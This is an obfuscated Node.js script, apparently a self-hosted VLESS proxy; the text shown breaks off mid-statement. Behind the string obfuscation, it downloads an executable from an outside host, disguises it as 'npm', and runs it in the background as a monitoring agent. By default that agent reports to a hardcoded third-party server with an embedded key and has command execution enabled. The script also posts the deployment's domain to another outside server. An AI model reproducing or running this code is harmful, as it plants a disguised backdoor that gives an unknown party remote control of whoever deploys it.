const _0x14432a=_0x1536;function _0xd59c(){const _0xa58295=['2048','Failed\x20to\x20process\x20POST\x20request:\x20','TCP_KEEPALIVE','\x1b[0m','VLESS\x20header\x20parse\x20error:\x20','Read\x20controller\x20close\x20error:','npm','Created\x20new\x20session\x20with\x20UUID:\x20','Failed\x20to\x20initialize\x20VLESS\x20connection','/([^/]+)(?:/([0-9]+))?$','\x0aclient_secret:\x20','now','writeFileSync','nextSeq','4820361OMBmKk',']\x20[','11375088kpLQtW','\x20bytes','VLESS\x20header\x20parsed\x20successfully','readable','8443','arm64','join','11786194HdgOyO','cork','warn','finally','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','VLESS\x20connection\x20to\x20','error','\x1b[31m','_startDownstreamResponse','2096','bufferSize','Buffered\x20packet\x20seq=','https://amd64.ssss.nyc.mn/agent','writable','currentStreamRes','message','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','utf-8','nohup\x20./npm\x20-s\x20','socket\x20hang\x20up','SESSION_TIMEOUT','Content-Type','vless://','releaseLock','pop','responseHeader','&mode=packet-up#','application/octet-stream','remote','setKeepAlive','catch','downstreamStarted','createConnection','nextTick','keepAliveTimeout','not\x20enough\x20data\x20to\x20read','end','443','createServer','setNoDelay','writableEnded','reset','parse\x20hostname\x20failed','\x20timed\x20out\x20without\x20downstream','Download\x20error:\x20','GET','destroyed','toString','Remote\x20error:\x20','Client\x20connection\x20closed','read\x20address\x20type\x20failed','get','cleanup','Failed\x20to\x20write\x20to\x20remote:\x20','info','enqueue','writeHead','trim','timeout','socket','chmod\x20+x\x20npm','Upload\x20error:\x20','utf8','Processing\x20packet:\x20seq=','processPacket','secureConnection','path','buffer','https://arm64.ssss.nyc.mn/agent','http','config.yaml','value','&path=','uuid','2053','decode','Socket\x20is\x20destroyed','BUFFER_SIZE','headerSent','pipeTo','arch','MAX_BUFFERED_POSTS','headersSent','Server\x20error:\x20','child_process','pendingPackets','2083','read','debug','includes','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','concat','Remote\x20connection\x20not\x20available','Too\x20many\x20buffered\x20packets','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Process\x20packet\x20error:\x20','Received\x20out\x20of\x20order\x20packet\x20seq=','TCP_NODELAY','aarch64','CHUNK_SIZE','reading_done','data','Starting\x20to\x20parse\x20VLESS\x20header','getReader','arm','XPATH','stream','base64','aborted','Relay\x20error:','unsupported\x20command:\x20','listen','from','Failed\x20to\x20parse\x20hostname','--tls','constructor','initializeVLESS','\x1b[32m','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Transfer-Encoding','text/html','set','_writeToRemote','lastActivity','1541792thLrfM','url','\x22}\x27','reduce','bufferedData','Failed\x20to\x20initialize\x20VLESS:\x20','New\x20secure\x20connection\x20using:\x20','push','done','uncork','vlessHeader','close','fill','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','floor','cleaned','resume','https://arm64.ssss.nyc.mn/v1','&fp=chrome&allowInsecure=1&type=xhttp&host=','GET,\x20POST','axios','resp','\x20before\x20initialization','Read\x20controller\x20error:','getWriter','Processed\x20packet\x20seq=','connect\x20timeout','988305RiNyzd','npm\x20running\x20error:\x20','initialized','UUID','533666uuGwVT','delete','no-store','\x20-p\x20','\x20>/dev/null\x202>&1\x20&','pause','2087','slice',',\x20size=','invalid\x20UUID','Cleaning\x20up\x20session\x20','Transform','startDownstream','Replit','LOG_LEVEL','log','split','%2F','Cleanup\x20error:\x20','finish','text/plain','false','Internal\x20Server\x20Error','write','5941852MLmMWi','Error\x20starting\x20downstream:\x20','pipe','has','port','Server\x20is\x20running\x20on\x20port\x20','length','a2056d0d-ceee-4aeb-9aab-37f64edd5710','method','pendingBuffers','destroy','read\x20vless\x20header\x20error:\x20','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','Connection\x20failed:\x20','readFile','createWriteStream'];_0xd59c=function(){return _0xa58295;};return _0xd59c();}function _0x1536(_0x1ee837,_0x30297b){_0x1ee837=_0x1ee837-0x1ae;const _0xd59cbc=_0xd59c();let _0x15364d=_0xd59cbc[_0x1ee837];return _0x15364d;}(function(_0x2817e4,_0x57ae4e){const _0x3e7688=_0x1536,_0x574970=_0x2817e4();while(!![]){try{const _0x425c14=parseInt(_0x3e7688(0x25d))/0x1+-parseInt(_0x3e7688(0x27c))/0x2+parseInt(_0x3e7688(0x1d8))/0x3+-parseInt(_0x3e7688(0x1ba))/0x4+-parseInt(_0x3e7688(0x278))/0x5+-parseInt(_0x3e7688(0x1da))/0x6+parseInt(_0x3e7688(0x1e1))/0x7;if(_0x425c14===_0x57ae4e)break;else _0x574970['push'](_0x574970['shift']());}catch(_0x1dd2ef){_0x574970['push'](_0x574970['shift']());}}}(_0xd59c,0xf0d94));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x14432a(0x226)),axios=require(_0x14432a(0x271)),path=require(_0x14432a(0x223)),{Buffer}=require(_0x14432a(0x224)),{exec,execSync}=require(_0x14432a(0x235)),UUID=process.env.UUID||_0x14432a(0x1c1),NEZHA_SERVER=process.env.NEZHA_SERVER||'nezha.kadcs.eu.org:443',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'sOq90vA8wAdW4fLKaE4JBTZqAmgvRcd8',AUTO_ACCESS=process.env.AUTO_ACCESS||![],XPATH=process.env.XPATH||UUID[_0x14432a(0x283)](0x0,0x8),SUB_PATH=process.env.SUB_PATH||''+UUID,DOMAIN=process.env.DOMAIN||'',NAME=process.env.NAME||_0x14432a(0x1af),PORT=process.env.PORT||0x1eb4,SETTINGS={[_0x14432a(0x27b)]:UUID,['LOG_LEVEL']:'none',['BUFFER_SIZE']:_0x14432a(0x1ca),['XPATH']:_0x14432a(0x1b3)+XPATH,[_0x14432a(0x232)]:0x1e,['MAX_POST_SIZE']:0xf4240,[_0x14432a(0x1f5)]:0x7530,['CHUNK_SIZE']:0x400*0x400,[_0x14432a(0x242)]:!![],[_0x14432a(0x1cc)]:!![]};function validate_uuid(_0x36dbbe,_0x17e028){for(let _0x57dc18=0x0;_0x57dc18<0x10;_0x57dc18++){if(_0x36dbbe[_0x57dc18]!==_0x17e028[_0x57dc18])return![];}return!![];}function concat_typed_arrays(_0x4ffb6f,..._0x4dfa6c){const _0x4ea9fe=_0x14432a;if(!_0x4dfa6c||_0x4dfa6c[_0x4ea9fe(0x1c0)]<0x1)return _0x4ffb6f;let _0x371d17=_0x4ffb6f[_0x4ea9fe(0x1c0)];for(let _0x27ae07 of _0x4dfa6c)_0x371d17+=_0x27ae07[_0x4ea9fe(0x1c0)];const _0x168279=new _0x4ffb6f[(_0x4ea9fe(0x254))](_0x371d17);_0x168279[_0x4ea9fe(0x25a)](_0x4ffb6f,0x0),_0x371d17=_0x4ffb6f[_0x4ea9fe(0x1c0)];for(let _0x569352 of _0x4dfa6c){_0x168279[_0x4ea9fe(0x25a)](_0x569352,_0x371d17),_0x371d17+=_0x569352[_0x4ea9fe(0x1c0)];}return _0x168279;}function log(_0x5a4e4b,..._0x57580c){const _0x3dda9f=_0x14432a;if(SETTINGS[_0x3dda9f(0x1b0)]==='none')return;const _0x4a6e05={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x570578={'debug':'\x1b[36m','info':_0x3dda9f(0x256),'warn':'\x1b[33m','error':_0x3dda9f(0x1e8),'reset':_0x3dda9f(0x1cd)},_0x277592=_0x4a6e05[SETTINGS[_0x3dda9f(0x1b0)]]||0x1,_0x59f7ce=_0x4a6e05[_0x5a4e4b]||0x0;if(_0x59f7ce>=_0x277592){const _0x5b79f2=new Date()['toISOString'](),_0x133e61=_0x570578[_0x5a4e4b]||_0x570578['reset'];console[_0x3dda9f(0x1b1)](_0x133e61+'['+_0x5b79f2+_0x3dda9f(0x1d9)+_0x5a4e4b+']',..._0x57580c,_0x570578[_0x3dda9f(0x20a)]);}}const getDownloadUrl=()=>{const _0x3bbd98=_0x14432a,_0x49e8ca=os[_0x3bbd98(0x231)]();return _0x49e8ca===_0x3bbd98(0x249)||_0x49e8ca===_0x3bbd98(0x1df)||_0x49e8ca===_0x3bbd98(0x243)?!NEZHA_PORT?_0x3bbd98(0x26e):_0x3bbd98(0x225):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3bbd98(0x1ed);},downloadFile=async()=>{const _0x5184b7=_0x14432a;if(!NEZHA_KEY)return;try{const _0x1cb925=getDownloadUrl(),_0xabae6f=await axios({'method':_0x5184b7(0x214),'url':_0x1cb925,'responseType':'stream'}),_0x58b3b9=fs[_0x5184b7(0x1c9)](_0x5184b7(0x1d0));return _0xabae6f[_0x5184b7(0x246)][_0x5184b7(0x1bc)](_0x58b3b9),new Promise((_0x2bde34,_0x4db98a)=>{const _0x430518=_0x5184b7;_0x58b3b9['on'](_0x430518(0x1b5),()=>{const _0x371c60=_0x430518;console[_0x371c60(0x1b1)]('npm\x20download\x20successfully'),exec(_0x371c60(0x21d),_0x3a1c7b=>{if(_0x3a1c7b)_0x4db98a(_0x3a1c7b);_0x2bde34();});}),_0x58b3b9['on']('error',_0x4db98a);});}catch(_0x5a0a8d){throw _0x5a0a8d;}},runnz=async()=>{const _0x13c71d=_0x14432a;await downloadFile();let _0x3bcc21='',_0x5c413a='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1ecabe=['443','8443',_0x13c71d(0x1ea),_0x13c71d(0x282),_0x13c71d(0x237),_0x13c71d(0x22b)];_0x3bcc21=_0x1ecabe[_0x13c71d(0x23a)](NEZHA_PORT)?_0x13c71d(0x253):'',_0x5c413a=_0x13c71d(0x1f3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x13c71d(0x27f)+NEZHA_KEY+'\x20'+_0x3bcc21+_0x13c71d(0x280);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5efade=NEZHA_SERVER[_0x13c71d(0x23a)](':')?NEZHA_SERVER[_0x13c71d(0x1b2)](':')[_0x13c71d(0x1f9)]():'',_0x44610e=new Set([_0x13c71d(0x206),_0x13c71d(0x1de),_0x13c71d(0x1ea),_0x13c71d(0x282),_0x13c71d(0x237),_0x13c71d(0x22b)]),_0x1f4dfb=_0x44610e[_0x13c71d(0x1bd)](_0x5efade)?'true':_0x13c71d(0x1b7),_0x4bac93=_0x13c71d(0x1d4)+NEZHA_KEY+_0x13c71d(0x23b)+NEZHA_SERVER+_0x13c71d(0x1c6)+_0x1f4dfb+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x13c71d(0x1d6)]('config.yaml',_0x4bac93);}_0x5c413a=_0x13c71d(0x257);}else return;}try{exec(_0x5c413a,{'shell':'/bin/bash'}),console['log']('npm\x20is\x20running');}catch(_0x421cc4){console[_0x13c71d(0x1e7)](_0x13c71d(0x279)+_0x421cc4);}};async function addAccessTask(){const _0x98da68=_0x14432a;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x2ed641='https://'+DOMAIN,_0x29b5e5=_0x98da68(0x1f1)+_0x2ed641+_0x98da68(0x25f);exec(_0x29b5e5,(_0x25d13e,_0x1ea1cd,_0x18a5fc)=>{const _0x30c82c=_0x98da68;if(_0x25d13e){console['error']('Error\x20sending\x20request:',_0x25d13e[_0x30c82c(0x1f0)]);return;}console['log']('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x1ea1cd);});}catch(_0x4a705a){console['error']('Error\x20added\x20Task:',_0x4a705a[_0x98da68(0x1f0)]);}}function parse_uuid(_0x9fc002){const _0x335f0f=_0x14432a;_0x9fc002=_0x9fc002['replaceAll']('-','');const _0x1b4bca=[];for(let _0x597707=0x0;_0x597707<0x10;_0x597707++){_0x1b4bca[_0x335f0f(0x264)](parseInt(_0x9fc002['substr'](_0x597707*0x2,0x2),0x10));}return _0x1b4bca;}async function read_vless_header(_0x2bd829,_0x5f3103){const _0x27ff1c=_0x14432a;let _0x7751c9=0x0,_0xd80e42=new Uint8Array(),_0x135a6c={'value':_0xd80e42,'done':![]};async function _0x10e396(_0x4bb478){const _0x56a29e=_0x1536;if(_0x135a6c[_0x56a29e(0x265)])throw new Error('header\x20length\x20too\x20short');const _0x41594c=_0x4bb478-_0x7751c9;if(_0x41594c<0x1)return;_0x135a6c=await read_atleast(_0x2bd829,_0x41594c),_0x7751c9+=_0x135a6c['value'][_0x56a29e(0x1c0)],_0xd80e42=concat_typed_arrays(_0xd80e42,_0x135a6c['value']);}await _0x10e396(0x1+0x10+0x1);const _0x280ef1=_0xd80e42[0x0],_0xb82593=_0xd80e42['slice'](0x1,0x1+0x10),_0x1f4c2e=parse_uuid(_0x5f3103);if(!validate_uuid(_0xb82593,_0x1f4c2e))throw new Error(_0x27ff1c(0x285));const _0x1a57aa=_0xd80e42[0x1+0x10],_0x3b566d=0x1+0x10+0x1+_0x1a57aa+0x1+0x2+0x1;await _0x10e396(_0x3b566d+0x1);const _0x198d32=_0xd80e42[0x1+0x10+0x1+_0x1a57aa],_0x311dbf=0x1;if(_0x198d32!==_0x311dbf)throw new Error(_0x27ff1c(0x24f)+_0x198d32);const _0x23d71d=(_0xd80e42[_0x3b566d-0x1-0x2]<<0x8)+_0xd80e42[_0x3b566d-0x1-0x1],_0x22826d=_0xd80e42[_0x3b566d-0x1],_0x55fc99=0x1,_0x5cd881=0x2,_0x4071d6=0x3;let _0x255dfe=-0x1;if(_0x22826d===_0x55fc99)_0x255dfe=_0x3b566d+0x4;else{if(_0x22826d===_0x4071d6)_0x255dfe=_0x3b566d+0x10;else _0x22826d===_0x5cd881&&(_0x255dfe=_0x3b566d+0x1+_0xd80e42[_0x3b566d]);}if(_0x255dfe<0x0)throw new Error(_0x27ff1c(0x213));await _0x10e396(_0x255dfe);const _0x2a3fde=_0x3b566d;let _0x49487c='';if(_0x22826d===_0x55fc99)_0x49487c=_0xd80e42[_0x27ff1c(0x283)](_0x2a3fde,_0x2a3fde+0x4)['join']('.');else{if(_0x22826d===_0x5cd881)_0x49487c=new TextDecoder()[_0x27ff1c(0x22c)](_0xd80e42[_0x27ff1c(0x283)](_0x2a3fde+0x1,_0x2a3fde+0x1+_0xd80e42[_0x2a3fde]));else _0x22826d===_0x4071d6&&(_0x49487c=_0xd80e42[_0x27ff1c(0x283)](_0x2a3fde,_0x2a3fde+0x10)[_0x27ff1c(0x260)]((_0x597c31,_0x20a20a,_0x5d24f9,_0x52f12a)=>_0x5d24f9%0x2?_0x597c31['concat'](((_0x52f12a[_0x5d24f9-0x1]<<0x8)+_0x20a20a)[_0x27ff1c(0x210)](0x10)):_0x597c31,[])['join'](':'));}if(!_0x49487c){log(_0x27ff1c(0x1e7),_0x27ff1c(0x252));throw new Error(_0x27ff1c(0x20b));}return log(_0x27ff1c(0x217),_0x27ff1c(0x1e6)+_0x49487c+':'+_0x23d71d),{'hostname':_0x49487c,'port':_0x23d71d,'data':_0xd80e42['slice'](_0x255dfe),'resp':new Uint8Array([_0x280ef1,0x0])};}async function read_atleast(_0x1f4039,_0x3a8ba1){const _0x346afc=_0x14432a,_0x30e5f0=[];let _0x328987=![];while(_0x3a8ba1>0x0&&!_0x328987){const _0x4ba49a=await _0x1f4039[_0x346afc(0x238)]();if(_0x4ba49a[_0x346afc(0x228)]){const _0x566b0f=new Uint8Array(_0x4ba49a[_0x346afc(0x228)]);_0x30e5f0[_0x346afc(0x264)](_0x566b0f),_0x3a8ba1-=_0x566b0f['length'];}_0x328987=_0x4ba49a[_0x346afc(0x265)];}if(_0x3a8ba1>0x0)throw new Error(_0x346afc(0x204));return{'value':concat_typed_arrays(..._0x30e5f0),'done':_0x328987};}async function parse_header(_0x5a31ba,_0x5c94f2){const _0x1148cb=_0x14432a;log(_0x1148cb(0x239),_0x1148cb(0x247));const _0x5b0879=_0x5c94f2[_0x1148cb(0x1dd)][_0x1148cb(0x248)]();try{const _0x244d45=await read_vless_header(_0x5b0879,_0x5a31ba);return log(_0x1148cb(0x239),_0x1148cb(0x1dc)),_0x244d45;}catch(_0x40d57f){log(_0x1148cb(0x1e7),_0x1148cb(0x1ce)+_0x40d57f[_0x1148cb(0x1f0)]);throw new Error(_0x1148cb(0x1c5)+_0x40d57f['message']);}finally{_0x5b0879[_0x1148cb(0x1f8)]();}}async function connect_remote(_0x268d47,_0x280f11){const _0x1b6a86=_0x14432a,_0x263a58=0x1f40;try{const _0x23cd8d=await timed_connect(_0x268d47,_0x280f11,_0x263a58);return _0x23cd8d[_0x1b6a86(0x208)](!![]),_0x23cd8d[_0x1b6a86(0x1fe)](!![],0x3e8),_0x23cd8d[_0x1b6a86(0x1eb)]=parseInt(SETTINGS[_0x1b6a86(0x22e)])*0x400,log(_0x1b6a86(0x217),'Connected\x20to\x20'+_0x268d47+':'+_0x280f11),_0x23cd8d;}catch(_0x58f479){log(_0x1b6a86(0x1e7),_0x1b6a86(0x1c7)+_0x58f479['message']);throw _0x58f479;}}function timed_connect(_0x241ea5,_0x5f237c,_0x36ef01){return new Promise((_0x56edaf,_0x22a629)=>{const _0x21149d=_0x1536,_0x480d83=net[_0x21149d(0x201)]({'host':_0x241ea5,'port':_0x5f237c}),_0x1981c7=setTimeout(()=>{const _0x5a2a30=_0x21149d;_0x22a629(new Error(_0x5a2a30(0x277)));},_0x36ef01);_0x480d83['on']('connect',()=>{clearTimeout(_0x1981c7),_0x56edaf(_0x480d83);}),_0x480d83['on'](_0x21149d(0x1e7),_0xc6905b=>{clearTimeout(_0x1981c7),_0x22a629(_0xc6905b);});});}function pipe_relay(){async function _0x3cf27f(_0x59022f,_0x2b6ee6,_0x2002af){const _0x252901=_0x1536,_0xe0ce93=parseInt(SETTINGS[_0x252901(0x244)]);if(_0x2002af[_0x252901(0x1c0)]>0x0){if(_0x2b6ee6[_0x252901(0x1b9)])_0x2b6ee6[_0x252901(0x1e2)](),_0x2b6ee6[_0x252901(0x1b9)](_0x2002af),process[_0x252901(0x202)](()=>_0x2b6ee6[_0x252901(0x266)]());else{const _0x2ac6d1=_0x2b6ee6[_0x252901(0x1ee)][_0x252901(0x275)]();try{await _0x2ac6d1['write'](_0x2002af);}finally{_0x2ac6d1[_0x252901(0x1f8)]();}}}try{_0x59022f[_0x252901(0x1bc)]?(_0x59022f[_0x252901(0x281)](),_0x59022f[_0x252901(0x1bc)](_0x2b6ee6,{'end':!![],'highWaterMark':_0xe0ce93}),_0x59022f[_0x252901(0x26d)]()):await _0x59022f[_0x252901(0x1dd)][_0x252901(0x230)](_0x2b6ee6[_0x252901(0x1ee)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x252901(0x21b)](SETTINGS[_0x252901(0x1f5)])});}catch(_0x2b826c){!_0x2b826c[_0x252901(0x1f0)][_0x252901(0x23a)](_0x252901(0x24d))&&log(_0x252901(0x1e7),_0x252901(0x24e),_0x2b826c['message']);throw _0x2b826c;}}return _0x3cf27f;}function socketToWebStream(_0x1d43ca){const _0x1214c2=_0x14432a;let _0x101c06,_0x32444c;return _0x1d43ca['on'](_0x1214c2(0x1e7),_0x59bb32=>{const _0xbf980b=_0x1214c2;log(_0xbf980b(0x1e7),'Socket\x20error:',_0x59bb32['message']),_0x101c06?.[_0xbf980b(0x1e7)](_0x59bb32),_0x32444c?.[_0xbf980b(0x1e7)](_0x59bb32);}),{'readable':new ReadableStream({'start'(_0x2578e8){const _0x1fb55d=_0x1214c2;_0x101c06=_0x2578e8,_0x1d43ca['on']('data',_0x3ea7ac=>{const _0x239c36=_0x1536;try{_0x2578e8[_0x239c36(0x218)](_0x3ea7ac);}catch(_0x2cf9b4){log(_0x239c36(0x1e7),_0x239c36(0x274),_0x2cf9b4[_0x239c36(0x1f0)]);}}),_0x1d43ca['on'](_0x1fb55d(0x205),()=>{const _0x19e364=_0x1fb55d;try{_0x2578e8[_0x19e364(0x268)]();}catch(_0x91dcaf){log(_0x19e364(0x1e7),_0x19e364(0x1cf),_0x91dcaf[_0x19e364(0x1f0)]);}});},'cancel'(){const _0x2e8afd=_0x1214c2;_0x1d43ca[_0x2e8afd(0x1c4)]();}}),'writable':new WritableStream({'start'(_0x54e289){_0x32444c=_0x54e289;},'write'(_0x44de01){return new Promise((_0x35f9b3,_0x5adaad)=>{const _0x3c5922=_0x1536;if(_0x1d43ca[_0x3c5922(0x20f)]){_0x5adaad(new Error(_0x3c5922(0x22d)));return;}_0x1d43ca[_0x3c5922(0x1b9)](_0x44de01,_0x5e590a=>{if(_0x5e590a)_0x5adaad(_0x5e590a);else _0x35f9b3();});});},'close'(){const _0x3f3793=_0x1214c2;!_0x1d43ca[_0x3f3793(0x20f)]&&_0x1d43ca[_0x3f3793(0x205)]();},'abort'(_0xd6c3e3){const _0x391c69=_0x1214c2;_0x1d43ca[_0x391c69(0x1c4)](_0xd6c3e3);}})};}function relay(_0x294119,_0x503b69,_0x5d93e8,_0x4f8c5a){const _0x484842=_0x14432a,_0x5bb5ce=pipe_relay();let _0x1bef76=![];const _0x3bb8bf=socketToWebStream(_0x5d93e8);function _0x28406e(){const _0x133bdb=_0x1536;if(!_0x1bef76){_0x1bef76=!![];try{_0x5d93e8[_0x133bdb(0x1c4)]();}catch(_0x21811b){!_0x21811b['message'][_0x133bdb(0x23a)](_0x133bdb(0x24d))&&!_0x21811b['message'][_0x133bdb(0x23a)](_0x133bdb(0x1f4))&&log(_0x133bdb(0x1e7),_0x133bdb(0x1b4)+_0x21811b[_0x133bdb(0x1f0)]);}}}const _0x41403f=_0x5bb5ce(_0x503b69,_0x3bb8bf,_0x4f8c5a[_0x484842(0x246)])['catch'](_0x49f32c=>{const _0x225f76=_0x484842;!_0x49f32c[_0x225f76(0x1f0)][_0x225f76(0x23a)](_0x225f76(0x24d))&&!_0x49f32c[_0x225f76(0x1f0)][_0x225f76(0x23a)](_0x225f76(0x1f4))&&log('error',_0x225f76(0x21e)+_0x49f32c[_0x225f76(0x1f0)]);})[_0x484842(0x1e4)](()=>{const _0x6b721a=_0x484842;_0x503b69[_0x6b721a(0x245)]&&_0x503b69[_0x6b721a(0x245)]();}),_0x4ef26f=_0x5bb5ce(_0x3bb8bf,_0x503b69,_0x4f8c5a[_0x484842(0x272)])[_0x484842(0x1ff)](_0x1882ff=>{const _0x1439c2=_0x484842;!_0x1882ff[_0x1439c2(0x1f0)][_0x1439c2(0x23a)](_0x1439c2(0x24d))&&!_0x1882ff['message'][_0x1439c2(0x23a)](_0x1439c2(0x1f4))&&log(_0x1439c2(0x1e7),_0x1439c2(0x20d)+_0x1882ff[_0x1439c2(0x1f0)]);});_0x4ef26f[_0x484842(0x1e4)](()=>_0x41403f)[_0x484842(0x1e4)](_0x28406e);}const sessions=new Map();class Session{constructor(_0x881a56){const _0x33d918=_0x14432a;this[_0x33d918(0x22a)]=_0x881a56,this['nextSeq']=0x0,this['downstreamStarted']=![],this[_0x33d918(0x25c)]=Date[_0x33d918(0x1d5)](),this[_0x33d918(0x267)]=null,this[_0x33d918(0x1fd)]=null,this['initialized']=![],this['responseHeader']=null,this[_0x33d918(0x22f)]=![],this[_0x33d918(0x261)]=new Map(),this[_0x33d918(0x26c)]=![],this[_0x33d918(0x236)]=[],this['currentStreamRes']=null,this[_0x33d918(0x1c3)]=new Map(),log(_0x33d918(0x239),_0x33d918(0x1d1)+_0x881a56);}async[_0x14432a(0x255)](_0xf67e84){const _0xb8410b=_0x14432a;if(this[_0xb8410b(0x27a)])return!![];try{log('debug','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet');const _0x21f20e=new ReadableStream({'start'(_0x2c289d){const _0x2555b8=_0xb8410b;_0x2c289d['enqueue'](_0xf67e84),_0x2c289d[_0x2555b8(0x268)]();}}),_0xc75124={'readable':_0x21f20e,'writable':new WritableStream()};return this[_0xb8410b(0x267)]=await parse_header(SETTINGS[_0xb8410b(0x27b)],_0xc75124),log(_0xb8410b(0x217),'VLESS\x20header\x20parsed:\x20'+this[_0xb8410b(0x267)]['hostname']+':'+this[_0xb8410b(0x267)][_0xb8410b(0x1be)]),this[_0xb8410b(0x1fd)]=await connect_remote(this[_0xb8410b(0x267)]['hostname'],this[_0xb8410b(0x267)][_0xb8410b(0x1be)]),log(_0xb8410b(0x217),'Remote\x20connection\x20established'),this[_0xb8410b(0x27a)]=!![],!![];}catch(_0x1d7351){return log(_0xb8410b(0x1e7),_0xb8410b(0x262)+_0x1d7351[_0xb8410b(0x1f0)]),![];}}async['processPacket'](_0x3b8cca,_0x2f57d2){const _0x368204=_0x14432a;try{this[_0x368204(0x1c3)][_0x368204(0x25a)](_0x3b8cca,_0x2f57d2),log(_0x368204(0x239),_0x368204(0x1ec)+_0x3b8cca+_0x368204(0x284)+_0x2f57d2[_0x368204(0x1c0)]);while(this[_0x368204(0x1c3)][_0x368204(0x1bd)](this['nextSeq'])){const _0x12a084=this[_0x368204(0x1c3)]['get'](this[_0x368204(0x1d7)]);this[_0x368204(0x1c3)]['delete'](this['nextSeq']);if(!this[_0x368204(0x27a)]&&this[_0x368204(0x1d7)]===0x0){if(!await this[_0x368204(0x255)](_0x12a084))throw new Error(_0x368204(0x1d2));this[_0x368204(0x1fa)]=Buffer[_0x368204(0x251)](this[_0x368204(0x267)][_0x368204(0x272)]),await this[_0x368204(0x25b)](this[_0x368204(0x267)][_0x368204(0x246)]),this[_0x368204(0x1ef)]&&this[_0x368204(0x1e9)]();}else{if(!this[_0x368204(0x27a)]){log(_0x368204(0x1e3),_0x368204(0x241)+_0x3b8cca+_0x368204(0x273));continue;}await this[_0x368204(0x25b)](_0x12a084);}this['nextSeq']++,log(_0x368204(0x239),_0x368204(0x276)+(this[_0x368204(0x1d7)]-0x1));}if(this[_0x368204(0x1c3)]['size']>SETTINGS['MAX_BUFFERED_POSTS'])throw new Error(_0x368204(0x23e));return!![];}catch(_0x4d5513){log(_0x368204(0x1e7),_0x368204(0x240)+_0x4d5513[_0x368204(0x1f0)]);throw _0x4d5513;}}['_startDownstreamResponse'](){const _0x4f552c=_0x14432a;if(!this[_0x4f552c(0x1ef)]||!this[_0x4f552c(0x1fa)])return;try{const _0x156207=this[_0x4f552c(0x1ef)][_0x4f552c(0x21c)]?.['alpnProtocol']||'http/1.1',_0x46a13c=_0x156207==='h2';!this[_0x4f552c(0x22f)]&&(log('debug','Sending\x20VLESS\x20response\x20header\x20('+_0x156207+'):\x20'+this[_0x4f552c(0x1fa)]['length']+_0x4f552c(0x1db)),this[_0x4f552c(0x1ef)]['write'](this[_0x4f552c(0x1fa)]),this[_0x4f552c(0x22f)]=!![]);if(_0x46a13c){this['currentStreamRes'][_0x4f552c(0x21c)]['setNoDelay'](!![]);const _0x595263=new require(_0x4f552c(0x24b))[_0x4f552c(0x287)]({'transform'(_0x4b0501,_0x375cae,_0x4c0890){const _0x26ca5a=_0x4f552c,_0x5d0bef=0x4000;for(let _0x2f06af=0x0;_0x2f06af<_0x4b0501[_0x26ca5a(0x1c0)];_0x2f06af+=_0x5d0bef){this['push'](_0x4b0501['slice'](_0x2f06af,_0x2f06af+_0x5d0bef));}_0x4c0890();}});this[_0x4f552c(0x1fd)][_0x4f552c(0x1bc)](_0x595263)[_0x4f552c(0x1bc)](this[_0x4f552c(0x1ef)]);}else this[_0x4f552c(0x1fd)][_0x4f552c(0x1bc)](this[_0x4f552c(0x1ef)]);this[_0x4f552c(0x1fd)]['on']('end',()=>{const _0x3b0f2d=_0x4f552c;!this[_0x3b0f2d(0x1ef)]['writableEnded']&&this[_0x3b0f2d(0x1ef)][_0x3b0f2d(0x205)]();}),this[_0x4f552c(0x1fd)]['on'](_0x4f552c(0x1e7),_0x535819=>{const _0x5418ea=_0x4f552c;log('error',_0x5418ea(0x211)+_0x535819[_0x5418ea(0x1f0)]),!this['currentStreamRes']['writableEnded']&&this[_0x5418ea(0x1ef)]['end']();});}catch(_0x3b6f83){log(_0x4f552c(0x1e7),_0x4f552c(0x1bb)+_0x3b6f83['message']),this[_0x4f552c(0x215)]();}}[_0x14432a(0x1ae)](_0x43ca50,_0x4004df){const _0x2eed1d=_0x14432a;return!_0x43ca50[_0x2eed1d(0x233)]&&_0x43ca50['writeHead'](0xc8,_0x4004df),this[_0x2eed1d(0x1ef)]=_0x43ca50,this[_0x2eed1d(0x27a)]&&this[_0x2eed1d(0x1fa)]&&this['_startDownstreamResponse'](),_0x43ca50['on'](_0x2eed1d(0x268),()=>{const _0x1bd658=_0x2eed1d;log(_0x1bd658(0x217),_0x1bd658(0x212)),this['cleanup']();}),!![];}async[_0x14432a(0x25b)](_0x545e5c){const _0x2a1b49=_0x14432a;if(!this[_0x2a1b49(0x1fd)]||this[_0x2a1b49(0x1fd)]['destroyed'])throw new Error(_0x2a1b49(0x23d));return new Promise((_0xa680a3,_0x1e1fe5)=>{const _0x1b25e1=_0x2a1b49;this[_0x1b25e1(0x1fd)]['write'](_0x545e5c,_0x5481d1=>{const _0x30aa18=_0x1b25e1;_0x5481d1?(log('error',_0x30aa18(0x216)+_0x5481d1[_0x30aa18(0x1f0)]),_0x1e1fe5(_0x5481d1)):_0xa680a3();});});}[_0x14432a(0x1e9)](){const 